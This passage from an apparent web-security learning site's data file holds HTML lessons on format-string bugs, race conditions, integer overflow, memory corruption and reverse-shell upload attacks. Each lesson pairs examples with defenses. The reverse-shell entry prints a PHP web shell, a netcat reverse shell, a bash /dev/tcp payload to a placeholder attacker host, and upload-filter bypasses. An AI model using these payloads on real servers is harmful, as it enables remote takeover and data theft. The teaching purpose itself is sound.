        <pre><code>%p %p %p %p</code></pre>

        <p>Attackers leak memory addresses useful for bypassing protections such as ASLR.</p>

        <h3>Crashing the Application:</h3>

        <pre><code>%s%s%s%s%s%s</code></pre>

        <p>Invalid memory access may cause segmentation faults.</p>

        <h3>Remote Exploitation Scenario:</h3>

        <p>Network applications processing attacker-controlled data may become remotely exploitable.</p>

        <h3>Instruction Pointer Corruption:</h3>

        <p>Advanced exploitation may overwrite execution control data and redirect program flow.</p>

        <h3>Example Using syslog():</h3>

        <pre><code>syslog(LOG_ERR, userInput);</code></pre>

        <p>Logging systems may become vulnerable if untrusted input is used directly.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Sensitive memory disclosure.</p>
        <p>2. Application crashes.</p>
        <p>3. Arbitrary memory writes.</p>
        <p>4. Remote Code Execution.</p>
        <p>5. Privilege escalation.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Invalid format string operations often trigger memory access violations.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Researchers analyze memory corruption and stack behavior using debuggers.</p>

        <h3>Indicators of Format String Vulnerabilities:</h3>

        <p>1. Unexpected memory leaks.</p>
        <p>2. Stack values appearing in output.</p>
        <p>3. Application crashes with format specifiers.</p>
        <p>4. Unsafe printf-style usage.</p>
        <p>5. Segmentation faults.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Legacy C applications

Logging systems

Network services

Embedded systems

Custom native software</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

printf(userInput)</code></pre>

        <p>The application treats attacker-controlled input as a format string.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

printf("%s", userInput)</code></pre>

        <p>The application safely prints user input as plain text.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
FORTIFY_SOURCE</code></pre>

        <p>Modern systems implement protections against memory corruption exploitation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Never pass user input directly as format strings.</b></p>

        <p><b>2. Always specify explicit format strings.</b></p>

        <p><b>3. Enable compiler security protections.</b></p>

        <p><b>4. Validate and sanitize input strictly.</b></p>

        <p><b>5. Use memory-safe programming practices.</b></p>

        <p><b>6. Monitor application crashes and anomalies.</b></p>

        <p><b>7. Perform regular security audits.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Compile with FORTIFY_SOURCE

Use DEP/NX protections

Restrict executable memory

Apply secure coding standards</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Valgrind
AddressSanitizer
Metasploit
Immunity Debugger</code></pre>

        <h3>Difference Between Buffer Overflow and Format String Vulnerability:</h3>

        <p><b>Buffer Overflow:</b> Corrupts memory by exceeding buffer boundaries.</p>

        <p><b>Format String Vulnerability:</b> Exploits unsafe formatting functions and specifiers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may leak memory addresses, expose sensitive information, overwrite memory structures, bypass operating system protections, or fully compromise vulnerable systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Format String vulnerabilities are considered extremely critical because arbitrary memory access may directly lead to Remote Code Execution and complete system compromise.</p>
    `
},


{
    "id": 44,
    "title": "Race Condition Exploit",
    "summary": `
        <p><b>Race Condition</b> is a dangerous vulnerability that occurs when multiple operations execute simultaneously in an unexpected order, causing inconsistent or insecure application behavior.</p>

        <p>This vulnerability may allow attackers to bypass security checks, manipulate transactions, abuse application logic, or gain unauthorized access to protected resources.</p>

        <h3>What is a Race Condition?</h3>

        <p>A race condition happens when two or more processes or requests compete to access or modify shared resources at the same time.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to properly synchronize critical operations before completing security-sensitive actions.</p>

        <h3>Basic Vulnerable Logic Example:</h3>

        <pre><code>Check account balance

Process payment

Update balance</code></pre>

        <p>If multiple requests arrive simultaneously, the balance check may fail to protect against duplicate actions.</p>

        <h3>Why are Race Conditions Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass restrictions, duplicate transactions, escalate privileges, or manipulate application state.</p>

        <h3>Double Spending Example:</h3>

        <pre><code>Send multiple purchase requests simultaneously</code></pre>

        <p>Attackers may spend the same balance multiple times before updates occur.</p>

        <h3>Coupon Abuse Example:</h3>

        <pre><code>Redeem the same coupon concurrently</code></pre>

        <p>Weak synchronization may allow unlimited coupon usage.</p>

        <h3>File Upload Race Condition:</h3>

        <pre><code>Upload malicious file before validation completes</code></pre>

        <p>Attackers may exploit temporary timing windows during processing.</p>

        <h3>TOCTOU Vulnerability:</h3>

        <pre><code>Time Of Check To Time Of Use</code></pre>

        <p>The application checks a condition but uses the resource later after its state changes.</p>

        <h3>Privilege Escalation Example:</h3>

        <pre><code>Change permissions during validation</code></pre>

        <p>Attackers may manipulate access control timing windows.</p>

        <h3>Password Reset Race Condition:</h3>

        <pre><code>Use reset token multiple times simultaneously</code></pre>

        <p>Weak token invalidation may allow repeated unauthorized actions.</p>

        <h3>Bank Transfer Scenario:</h3>

        <pre><code>POST /transfer</code></pre>

        <p>Multiple concurrent transfers may bypass account balance protections.</p>

        <h3>Session Race Condition:</h3>

        <pre><code>Reuse expired session before invalidation completes</code></pre>

        <p>Improper session synchronization may expose authentication weaknesses.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Double spending.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Authentication bypass.</p>
        <p>4. Resource duplication.</p>
        <p>5. Business logic abuse.</p>

        <h3>Concurrent Request Exploitation:</h3>

        <pre><code>Send multiple parallel HTTP requests</code></pre>

        <p>Attackers exploit timing windows using simultaneous requests.</p>

        <h3>Indicators of Race Condition Vulnerabilities:</h3>

        <p>1. Inconsistent application behavior.</p>
        <p>2. Missing transaction locking.</p>
        <p>3. Duplicate resource creation.</p>
        <p>4. Timing-dependent security checks.</p>
        <p>5. Improper session handling.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Payment systems

Coupon redemption

Authentication systems

Password reset functionality

File upload systems</code></pre>

        <h3>Example Using Burp Suite Turbo Intruder:</h3>

        <pre><code>POST /redeem-coupon HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker sends multiple concurrent requests to exploit timing flaws.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Check resource

Perform action

Update status</code></pre>

        <p>The application performs critical operations without proper locking mechanisms.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use transaction locking

Apply atomic operations

Validate requests safely</code></pre>

        <p>The application synchronizes sensitive operations securely.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use atomic transactions for critical operations.</b></p>

        <p><b>2. Apply proper locking mechanisms.</b></p>

        <p><b>3. Validate resource state consistently.</b></p>

        <p><b>4. Prevent duplicate request processing.</b></p>

        <p><b>5. Use secure session invalidation logic.</b></p>

        <p><b>6. Monitor concurrent request anomalies.</b></p>

        <p><b>7. Perform concurrency security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable transaction isolation

Use database locking

Apply request synchronization

Monitor abnormal concurrency

Enable detailed logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite Turbo Intruder
OWASP ZAP
ffuf
Race The Web
Postman</code></pre>

        <h3>Difference Between Race Conditions and Logic Bugs:</h3>

        <p><b>Race Condition:</b> Exploits timing windows between concurrent operations.</p>

        <p><b>Logic Bug:</b> Exploits flawed application business logic regardless of timing.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may duplicate transactions, bypass restrictions, escalate privileges, abuse financial systems, manipulate resources, or compromise critical application functionality.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Race Condition vulnerabilities are considered highly critical because improper synchronization may expose core application logic and security protections to abuse.</p>
    `
},


{
    "id": 45,
    "title": "Integer Overflow Vulnerability",
    "summary": `
        <p><b>Integer Overflow</b> is a dangerous vulnerability that occurs when arithmetic operations produce values larger or smaller than the storage capacity of an integer variable.</p>

        <p>This vulnerability may allow attackers to bypass security checks, corrupt memory, trigger unexpected behavior, or achieve arbitrary code execution in vulnerable applications.</p>

        <h3>What is an Integer?</h3>

        <p>An integer is a numeric data type used to store whole numbers in computer memory.</p>

        <h3>Basic Integer Sizes:</h3>

        <pre><code>8-bit
16-bit
32-bit
64-bit</code></pre>

        <p>Each integer type has a limited storage range.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to validate arithmetic operations properly before storing results inside fixed-size integer variables.</p>

        <h3>Basic Overflow Example:</h3>

        <pre><code>unsigned char x = 255;

x = x + 1;</code></pre>

        <p>The value exceeds the maximum size and wraps around unexpectedly.</p>

        <h3>Overflow Result:</h3>

        <pre><code>x = 0</code></pre>

        <p>The integer wraps back to zero because the storage limit is exceeded.</p>

        <h3>Why is Integer Overflow Dangerous?</h3>

        <p>Successful exploitation may bypass validation logic, trigger memory corruption, allocate incorrect memory sizes, or compromise application security.</p>

        <h3>Signed vs Unsigned Integers:</h3>

        <pre><code>signed int
unsigned int</code></pre>

        <p>Signed integers allow negative values while unsigned integers only store positive values.</p>

        <h3>Signed Integer Overflow Example:</h3>

        <pre><code>int x = 2147483647;

x = x + 1;</code></pre>

        <p>The value exceeds the maximum 32-bit signed integer limit.</p>

        <h3>Memory Allocation Vulnerability:</h3>

        <pre><code>size = count * sizeof(item);

malloc(size);</code></pre>

        <p>Overflow during size calculation may allocate insufficient memory.</p>

        <h3>Buffer Overflow Chain:</h3>

        <p>Integer overflows may lead to memory corruption vulnerabilities such as buffer overflows.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>if(balance + deposit &lt; limit)</code></pre>

        <p>Overflow conditions may bypass financial or security restrictions.</p>

        <h3>Loop Overflow Example:</h3>

        <pre><code>for(i=0; i&lt;=max; i++)</code></pre>

        <p>Incorrect integer handling may create infinite loops or logic errors.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Memory corruption.</p>
        <p>2. Authentication bypass.</p>
        <p>3. Arbitrary code execution.</p>
        <p>4. Denial of Service.</p>
        <p>5. Application logic manipulation.</p>

        <h3>Underflow Example:</h3>

        <pre><code>unsigned int x = 0;

x = x - 1;</code></pre>

        <p>The value wraps around to the maximum integer value.</p>

        <h3>Integer Underflow Result:</h3>

        <pre><code>x = 4294967295</code></pre>

        <p>Unsigned integers may wrap into extremely large values.</p>

        <h3>Example Using C:</h3>

        <pre><code>int size = userInput * 1024;</code></pre>

        <p>Attackers may supply large values that trigger overflow conditions.</p>

        <h3>Indicators of Integer Overflow Vulnerabilities:</h3>

        <p>1. Unexpected negative values.</p>
        <p>2. Application crashes.</p>
        <p>3. Incorrect memory allocation.</p>
        <p>4. Arithmetic anomalies.</p>
        <p>5. Unexpected loop behavior.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Low-level C programs

Image parsers

File processing software

Embedded systems

Network services</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

size = userInput * itemSize;</code></pre>

        <p>The application performs arithmetic without overflow validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate ranges

Check arithmetic boundaries

Use safe integer handling</code></pre>

        <p>The application verifies arithmetic operations before processing values.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>Integer sanitizers
Compiler protections
Safe integer libraries</code></pre>

        <p>Modern development tools help detect arithmetic vulnerabilities.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate integer ranges strictly.</b></p>

        <p><b>2. Check arithmetic boundaries before operations.</b></p>

        <p><b>3. Use safe integer handling libraries.</b></p>

        <p><b>4. Enable compiler overflow protections.</b></p>

        <p><b>5. Avoid unsafe type conversions.</b></p>

        <p><b>6. Monitor arithmetic anomalies.</b></p>

        <p><b>7. Perform continuous security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable compiler sanitizers

Use secure coding standards

Apply memory protections

Restrict unsafe arithmetic

Perform code auditing</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>AddressSanitizer
UBSan
Valgrind
GDB
Clang Sanitizers</code></pre>

        <h3>Difference Between Integer Overflow and Buffer Overflow:</h3>

        <p><b>Integer Overflow:</b> Corrupts arithmetic logic and numeric calculations.</p>

        <p><b>Buffer Overflow:</b> Corrupts memory boundaries directly.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may trigger memory corruption, bypass security checks, crash applications, manipulate logic calculations, or chain vulnerabilities into arbitrary code execution attacks.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Integer Overflow vulnerabilities are considered highly critical because unsafe arithmetic operations may directly lead to memory corruption and application compromise.</p>
    `
},


{
    "id": 46,
    "title": "Memory Corruption Basics",
    "summary": `
        <p><b>Memory Corruption</b> is a critical class of vulnerabilities that occurs when a program improperly accesses, modifies, or manages computer memory.</p>

        <p>These vulnerabilities may allow attackers to crash applications, leak sensitive information, manipulate execution flow, or achieve arbitrary code execution.</p>

        <h3>What is Computer Memory?</h3>

        <p>Computer memory stores data and instructions while programs are running.</p>

        <h3>Main Memory Regions:</h3>

        <pre><code>Stack
Heap
Data Segment
Code Segment</code></pre>

        <p>Applications use different memory regions for different purposes during execution.</p>

        <h3>How Does Memory Corruption Occur?</h3>

        <p>Memory corruption occurs when applications improperly read from or write to memory locations.</p>

        <h3>Common Causes:</h3>

        <pre><code>Buffer Overflow
Use After Free
Double Free
Integer Overflow
Out Of Bounds Access</code></pre>

        <p>Unsafe memory handling operations frequently lead to corruption vulnerabilities.</p>

        <h3>Basic Buffer Overflow Example:</h3>

        <pre><code>char buffer[16];

strcpy(buffer, input);</code></pre>

        <p>Excessive input may overwrite adjacent memory regions.</p>

        <h3>Out Of Bounds Read Example:</h3>

        <pre><code>array[100]</code></pre>

        <p>Accessing memory outside valid boundaries may expose sensitive information.</p>

        <h3>Use After Free Example:</h3>

        <pre><code>free(ptr);

ptr->data</code></pre>

        <p>The application accesses memory after it has already been released.</p>

        <h3>Why is Memory Corruption Dangerous?</h3>

        <p>Successful exploitation may allow attackers to manipulate memory structures, hijack execution flow, bypass protections, or fully compromise systems.</p>

        <h3>Instruction Pointer Corruption:</h3>

        <pre><code>EIP
RIP</code></pre>

        <p>Attackers attempt to control execution pointers stored in memory.</p>

        <h3>Heap Corruption Example:</h3>

        <pre><code>malloc()
free()</code></pre>

        <p>Improper heap memory management may lead to arbitrary code execution.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Invalid memory access frequently crashes vulnerable applications.</p>

        <h3>Information Disclosure Example:</h3>

        <pre><code>Read uninitialized memory</code></pre>

        <p>Attackers may leak passwords, tokens, or sensitive application data.</p>

        <h3>Remote Code Execution Scenario:</h3>

        <p>Advanced attackers may inject shellcode or manipulate execution flow to run arbitrary commands.</p>

        <h3>Shellcode Concept:</h3>

        <pre><code>\x90\x90\x90</code></pre>

        <p>NOP sleds are commonly used during memory exploitation.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Arbitrary code execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Information disclosure.</p>
        <p>4. Denial of Service.</p>
        <p>5. Full system compromise.</p>

        <h3>Memory Safety Problems:</h3>

        <pre><code>Unsafe pointers
Manual memory management
Unchecked input
Improper object handling</code></pre>

        <p>Low-level programming languages are especially vulnerable to memory corruption issues.</p>

        <h3>Common Vulnerable Languages:</h3>

        <pre><code>C
C++
Assembly</code></pre>

        <p>Manual memory management increases the risk of security vulnerabilities.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Security researchers analyze memory corruption using debuggers.</p>

        <h3>Indicators of Memory Corruption:</h3>

        <p>1. Unexpected crashes.</p>
        <p>2. Segmentation faults.</p>
        <p>3. Corrupted application behavior.</p>
        <p>4. Invalid pointer access.</p>
        <p>5. Memory access violations.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit
Control Flow Integrity</code></pre>

        <p>Modern operating systems implement defenses against memory exploitation.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, input)</code></pre>

        <p>The application performs unsafe memory operations without validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate input length

Use memory-safe functions

Apply secure coding standards</code></pre>

        <p>The application protects memory using safe programming practices.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use memory-safe programming practices.</b></p>

        <p><b>2. Validate all input boundaries strictly.</b></p>

        <p><b>3. Avoid unsafe memory functions.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply modern operating system defenses.</b></p>

        <p><b>6. Monitor crashes and abnormal behavior.</b></p>

        <p><b>7. Perform continuous security auditing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Use DEP/NX protections

Compile with stack canaries

Restrict executable memory

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Valgrind
AddressSanitizer
Immunity Debugger
Metasploit</code></pre>

        <h3>Difference Between Memory Corruption and Logic Vulnerabilities:</h3>

        <p><b>Memory Corruption:</b> Exploits improper memory access and manipulation.</p>

        <p><b>Logic Vulnerabilities:</b> Exploit flawed business or application logic.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may crash systems, leak sensitive information, hijack execution flow, bypass security mechanisms, escalate privileges, or fully compromise vulnerable applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Memory Corruption vulnerabilities are considered extremely critical because direct memory manipulation may lead to arbitrary code execution and complete system compromise.</p>
    `
},


{
    "id": 47,
    "title": "Reverse Shell Upload Attack",
    "summary": `
        <p><b>Reverse Shell Upload Attack</b> is a dangerous exploitation technique where attackers upload malicious server-side scripts that establish remote shell access back to the attacker's machine.</p>

        <p>This attack is commonly associated with insecure file upload vulnerabilities and may lead to full server compromise, Remote Code Execution, or unauthorized system control.</p>

        <h3>What is a Reverse Shell?</h3>

        <p>A reverse shell is a connection initiated from the victim server back to the attacker's system, allowing remote command execution.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when applications allow unrestricted or improperly validated file uploads containing executable code.</p>

        <h3>Basic Vulnerable Upload Scenario:</h3>

        <pre><code>Upload PHP file to web server</code></pre>

        <p>If uploaded files are executed by the server, attackers may gain code execution.</p>

        <h3>Basic PHP Reverse Shell Example:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>The uploaded script allows attackers to execute system commands remotely.</p>

        <h3>Why is Reverse Shell Upload Dangerous?</h3>

        <p>Successful exploitation may provide attackers with direct remote access to the vulnerable server.</p>

        <h3>Netcat Reverse Shell Example:</h3>

        <pre><code>nc -e /bin/bash attacker-ip 4444</code></pre>

        <p>The server connects back to the attacker's listener.</p>

        <h3>Listener Setup Example:</h3>

        <pre><code>nc -lvnp 4444</code></pre>

        <p>The attacker waits for incoming reverse shell connections.</p>

        <h3>PHP Reverse Shell Payload:</h3>

        <pre><code>&lt;?php
exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker-ip/4444 0&gt;&amp;1'");
?&gt;</code></pre>

        <p>The payload creates an interactive shell connection back to the attacker.</p>

        <h3>Common Upload Targets:</h3>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi</code></pre>

        <p>Attackers upload executable server-side scripts supported by the target server.</p>

        <h3>Extension Bypass Example:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Weak validation mechanisms may allow disguised executable files.</p>

        <h3>MIME Type Bypass:</h3>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>Attackers spoof upload headers to bypass file restrictions.</p>

        <h3>Double Extension Example:</h3>

        <pre><code>shell.php.png</code></pre>

        <p>Improper extension filtering may execute uploaded scripts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote shell access.</p>
        <p>2. Server compromise.</p>
        <p>3. Privilege escalation.</p>
        <p>4. Data theft.</p>
        <p>5. Persistence installation.</p>

        <h3>Linux Command Execution Example:</h3>

        <pre><code>whoami
id
uname -a</code></pre>

        <p>Attackers enumerate system information after gaining shell access.</p>

        <h3>Web Shell vs Reverse Shell:</h3>

        <p><b>Web Shell:</b> Executes commands through HTTP requests.</p>

        <p><b>Reverse Shell:</b> Creates an outbound interactive shell connection.</p>

        <h3>Indicators of Reverse Shell Upload Attacks:</h3>

        <p>1. Suspicious uploaded executable files.</p>
        <p>2. Unexpected outbound network connections.</p>
        <p>3. Strange server processes.</p>
        <p>4. Unusual file upload activity.</p>
        <p>5. Remote command execution behavior.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Image upload systems

Profile picture uploads

Document management portals

CMS platforms

File sharing systems</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker uploads malicious executable payloads through vulnerable file upload endpoints.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Move uploaded file directly to web directory</code></pre>

        <p>The application stores attacker-controlled files without proper validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate extensions

Store uploads outside web root

Block script execution</code></pre>

        <p>The application prevents uploaded files from executing as server-side code.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate file extensions strictly.</b></p>

        <p><b>2. Validate MIME types securely.</b></p>

        <p><b>3. Store uploads outside executable directories.</b></p>

        <p><b>4. Disable script execution inside upload folders.</b></p>

        <p><b>5. Rename uploaded files safely.</b></p>

        <p><b>6. Apply antivirus and malware scanning.</b></p>

        <p><b>7. Monitor suspicious outbound connections.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable dangerous functions

Restrict upload permissions

Apply least privilege execution

Use WAF protections

Enable security monitoring</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Netcat
Wireshark</code></pre>

        <h3>Difference Between Reverse Shell and Bind Shell:</h3>

        <p><b>Reverse Shell:</b> The victim server connects back to the attacker.</p>

        <p><b>Bind Shell:</b> The victim server opens a listening port for attackers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain full remote control over servers, execute arbitrary commands, steal sensitive data, escalate privileges, deploy malware, or pivot deeper into internal networks.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Reverse Shell Upload attacks are considered extremely critical because unrestricted file upload combined with code execution may directly lead to complete server compromise.</p>
    `
},


);
